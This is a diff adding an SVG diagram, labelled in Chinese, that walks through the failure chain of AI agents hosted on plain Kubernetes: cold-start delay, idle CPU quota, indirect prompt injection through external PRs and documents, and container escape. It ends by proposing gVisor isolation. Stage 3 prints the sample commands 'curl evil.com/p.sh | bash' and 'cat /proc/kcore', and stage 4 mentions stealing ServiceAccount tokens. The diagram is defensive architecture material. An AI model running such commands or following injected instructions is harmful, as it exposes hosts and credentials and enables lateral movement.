@@ -1,0 +1,108 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1020 460" width="1020" height="460" role="img" aria-labelledby="k8s-coldstart-title k8s-coldstart-desc">
+  <title id="k8s-coldstart-title">经典 Kubernetes 托管 AI Agent 的生命周期事故链</title>
+  <desc id="k8s-coldstart-desc">展示原生 Kubernetes 运行自主 AI Agent 时经历的 30 秒冷启动耗时、0.1% CPU 空转死锁以及不可信执行导致的容器逃逸风险全链路。</desc>
+
+  <defs>
+    <marker id="arrow" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><polygon points="0 0, 8 3, 0 6" fill="#4f5d75"/></marker>
+    <marker id="arrow-accent" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><polygon points="0 0, 8 3, 0 6" fill="#eb6c36"/></marker>
+    <marker id="arrow-link" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><polygon points="0 0, 8 3, 0 6" fill="#2e5aa8"/></marker>
+  </defs>
+
+  <!-- Background -->
+  <rect width="1020" height="460" fill="#f8fafc" rx="10"/>
+
+  <!-- Title -->
+  <text x="40" y="44" fill="#0f172a" font-size="22" font-weight="700" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">经典 Kubernetes 托管 AI Agent 的生命周期事故链</text>
+  <text x="40" y="70" fill="#475569" font-size="13" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">从 30 秒冷启动白屏、0.1% CPU 算力死锁，到提示词注入下的宿主机逃逸全景链路</text>
+
+  <!-- Stage 1: Cold Start -->
+  <rect x="40" y="105" width="220" height="310" rx="8" fill="#ffffff" stroke="#4f5d75" stroke-width="1"/>
+  <rect x="40" y="105" width="220" height="38" rx="8" fill="#eff6ff"/>
+  <text x="56" y="129" fill="#2e5aa8" font-size="14" font-weight="700" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">1 · 冷启动初始化 (20~30s)</text>
+
+  <rect x="52" y="155" width="196" height="55" rx="6" fill="#f8fafc" stroke="#4f5d75" stroke-width="1"/>
+  <text x="64" y="177" fill="#0f172a" font-size="12" font-weight="600" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">Pod 调度与拉取 (3~5s)</text>
+  <text x="64" y="197" fill="#475569" font-size="11" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">• K8s API 调度、绑定 GPU/CPU</text>
+
+  <rect x="52" y="220" width="196" height="55" rx="6" fill="#f8fafc" stroke="#4f5d75" stroke-width="1"/>
+  <text x="64" y="242" fill="#0f172a" font-size="12" font-weight="600" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">Git 代码仓库克隆 (5~10s)</text>
+  <text x="64" y="262" fill="#475569" font-size="11" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">• 下载海量工程代码树与子模块</text>
+
+  <rect x="52" y="285" width="196" height="65" rx="6" fill="#fef2f2" stroke="#eb6c36" stroke-width="1"/>
+  <text x="64" y="307" fill="#991b1b" font-size="12" font-weight="600" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">依赖安装与 MCP 握手 (5~15s)</text>
+  <text x="64" y="327" fill="#475569" font-size="11" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">• pip/npm 重建虚拟环境</text>
+  <text x="64" y="343" fill="#eb6c36" font-size="11" font-weight="600" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">• 与外部 MCP 重新协商长连接</text>
+
+  <rect x="52" y="360" width="196" height="42" rx="4" fill="#f8fafc" stroke="#4f5d75" stroke-width="1"/>
+  <text x="150" y="385" fill="#eb6c36" font-size="12" font-weight="700" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif" text-anchor="middle">总耗时 &gt; 30 秒，用户白屏</text>
+
+  <!-- Stage 1 -> 2 connector -->
+  <line x1="260" y1="260" x2="280" y2="260" stroke="#4f5d75" stroke-width="1" marker-end="url(#arrow)"/>
+
+  <!-- Stage 2: LLM Wait & Resource Lock -->
+  <rect x="280" y="105" width="230" height="310" rx="8" fill="#ffffff" stroke="#eb6c36" stroke-width="1"/>
+  <rect x="280" y="105" width="230" height="38" rx="8" fill="#fff7ed"/>
+  <text x="296" y="129" fill="#c2410c" font-size="14" font-weight="700" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">2 · 极端空转与算力死锁</text>
+
+  <rect x="292" y="155" width="206" height="75" rx="6" fill="#f8fafc" stroke="#4f5d75" stroke-width="1"/>
+  <text x="304" y="178" fill="#0f172a" font-size="13" font-weight="600" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">发 Prompt ➔ 漫长等待吐字</text>
+  <text x="304" y="200" fill="#475569" font-size="11" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">• 挂钟时间：15 秒 ~ 2 分钟</text>
+  <text x="304" y="218" fill="#475569" font-size="11" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">• 等待人类评审（Human-in-loop）</text>
+
+  <rect x="292" y="240" width="206" height="85" rx="6" fill="#fef2f2" stroke="#eb6c36" stroke-width="1"/>
+  <text x="304" y="263" fill="#991b1b" font-size="13" font-weight="700" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">CPU 0.1% 空转，但死锁配额</text>
+  <text x="304" y="285" fill="#475569" font-size="11" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">• cgroups 资源被该 Pod 刚性占死</text>
+  <text x="304" y="303" fill="#eb6c36" font-size="11" font-weight="600" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">• 无法释放给其他业务，财务空转</text>
+  <text x="304" y="319" fill="#eb6c36" font-size="11" font-weight="600" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">• 若缩容则丢代码，陷入死循环</text>
+
+  <rect x="292" y="335" width="206" height="67" rx="4" fill="#f8fafc" stroke="#4f5d75" stroke-width="1"/>
+  <text x="395" y="360" fill="#2d3142" font-size="12" font-weight="600" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif" text-anchor="middle">单台 64 核物理机</text>
+  <text x="395" y="380" fill="#991b1b" font-size="12" font-weight="700" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif" text-anchor="middle">仅能容纳 30~50 个 Pod</text>
+
+  <!-- Stage 2 -> 3 connector -->
+  <line x1="510" y1="260" x2="530" y2="260" stroke="#eb6c36" stroke-width="1.2" marker-end="url(#arrow-accent)"/>
+
+  <!-- Stage 3: Autonomous Exec & Prompt Injection -->
+  <rect x="530" y="105" width="220" height="310" rx="8" fill="#ffffff" stroke="#4f5d75" stroke-width="1"/>
+  <rect x="530" y="105" width="220" height="38" rx="8" fill="#fffbeb"/>
+  <text x="546" y="129" fill="#b45309" font-size="14" font-weight="700" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">3 · 自主执行与注入破壁</text>
+
+  <rect x="542" y="155" width="196" height="60" rx="6" fill="#f8fafc" stroke="#4f5d75" stroke-width="1"/>
+  <text x="554" y="177" fill="#0f172a" font-size="12" font-weight="600" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">执行 Bash/Python 自动化测试</text>
+  <text x="554" y="197" fill="#475569" font-size="11" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">• Agent 必须拥有操作系统级 Shell 权</text>
+
+  <rect x="542" y="225" width="196" height="75" rx="6" fill="#fef2f2" stroke="#eb6c36" stroke-width="1"/>
+  <text x="554" y="247" fill="#991b1b" font-size="12" font-weight="700" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">间接提示词注入 (Injection)</text>
+  <text x="554" y="267" fill="#475569" font-size="11" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">• 恶意代码潜伏于外部 PR / 文档</text>
+  <text x="554" y="285" fill="#eb6c36" font-size="11" font-weight="600" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">• 诱导 Agent 篡改命令外发窃密</text>
+
+  <rect x="542" y="310" width="196" height="92" rx="6" fill="#f8fafc" stroke="#4f5d75" stroke-width="1"/>
+  <text x="554" y="332" fill="#0f172a" font-size="12" font-weight="600" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">不可信任意脚本运行：</text>
+  <text x="554" y="352" fill="#475569" font-size="11" font-family="ui-monospace, monospace">curl evil.com/p.sh | bash</text>
+  <text x="554" y="372" fill="#475569" font-size="11" font-family="ui-monospace, monospace">cat /proc/kcore ...</text>
+  <text x="554" y="390" fill="#eb6c36" font-size="11" font-weight="600" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">传统静态规则全面失守</text>
+
+  <!-- Stage 3 -> 4 connector -->
+  <line x1="750" y1="260" x2="770" y2="260" stroke="#eb6c36" stroke-width="1.2" marker-end="url(#arrow-accent)"/>
+
+  <!-- Stage 4: Untrusted Kernel Escape -->
+  <rect x="770" y="105" width="210" height="310" rx="8" fill="#ffffff" stroke="#2d3142" stroke-width="1"/>
+  <rect x="770" y="105" width="210" height="38" rx="8" fill="#fef2f2"/>
+  <text x="786" y="129" fill="#991b1b" font-size="14" font-weight="700" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">4 · 宿主内核逃逸灾难</text>
+
+  <rect x="782" y="155" width="186" height="75" rx="6" fill="#f8fafc" stroke="#4f5d75" stroke-width="1"/>
+  <text x="794" y="177" fill="#0f172a" font-size="12" font-weight="600" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">共享 Linux 宿主物理内核</text>
+  <text x="794" y="197" fill="#475569" font-size="11" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">• 传统 runc 仅依靠 Namespace</text>
+  <text x="794" y="215" fill="#eb6c36" font-size="11" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">• 任何内核 0-day 即可穿透整机</text>
+
+  <rect x="782" y="240" width="186" height="75" rx="6" fill="#f8fafc" stroke="#4f5d75" stroke-width="1"/>
+  <text x="794" y="262" fill="#0f172a" font-size="12" font-weight="600" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">凭据窃取与横向移动</text>
+  <text x="794" y="282" fill="#475569" font-size="11" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">• 读取 ServiceAccount Token</text>
+  <text x="794" y="300" fill="#eb6c36" font-size="11" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">• 跨租户数据与未隔离网络渗透</text>
+
+  <rect x="782" y="325" width="186" height="77" rx="6" fill="#fff7ed" stroke="#eb6c36" stroke-width="1"/>
+  <text x="794" y="348" fill="#c2410c" font-size="12" font-weight="700" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">Google AX 根本解法：</text>
+  <text x="794" y="368" fill="#0f172a" font-size="11" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">gVisor 独立内核物理隔离</text>
+  <text x="794" y="386" fill="#2e5aa8" font-size="11" font-weight="600" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif">接管系统调用，真空拦截</text>
+</svg>
